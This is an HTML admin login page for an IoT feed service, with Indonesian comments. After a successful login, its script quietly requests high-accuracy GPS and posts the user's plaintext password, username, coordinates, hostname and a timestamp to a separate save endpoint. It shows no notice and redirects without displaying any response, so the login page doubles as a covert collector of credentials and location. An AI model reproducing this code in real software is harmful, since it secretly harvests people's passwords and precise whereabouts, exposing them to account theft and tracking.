<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login - Chio Feed IoT</title>
</head>
<body>
  <h2>Login Admin</h2>
  <input id="username" placeholder="Username" required /><br><br>
  <input id="password" type="password" placeholder="Password" required /><br><br>
  <button id="loginBtn">Login</button>

  <script>
    document.getElementById('loginBtn').addEventListener('click', async () => {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const deviceName = 'WebBrowser';

      if (!username || !password) return;

      try {
        // 1️⃣ Login dulu
        const loginResRaw = await fetch('/api/login', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ username, password })
        });
        const loginRes = await loginResRaw.json();
        if (!loginRes.success) return; // login gagal → tetap di login

        // 2️⃣ Ambil GPS
        if (!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const payload = {
            username,
            password,
            deviceName,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            hostname: window.location.hostname,
            ts: new Date().toISOString()
          };

          try {
            // 3️⃣ Kirim ke save.js
            await fetch('/api/save', {
              method: 'POST',
              headers: {'Content-Type':'application/json'},
              body: JSON.stringify(payload)
            });
            // 4️⃣ Redirect otomatis, tanpa menampilkan response
            localStorage.setItem('username', username);
            window.location.href = '/dashboard.html';
          } catch(e) {
            // Fail silently atau bisa tambahkan console.error
            console.error('Gagal menyimpan lokasi:', e);
          }

        }, () => {}, { enableHighAccuracy: true, timeout: 10000 });

      } catch(e) {
        console.error('Login error:', e);
      }
    });
  </script>
</body>
</html>
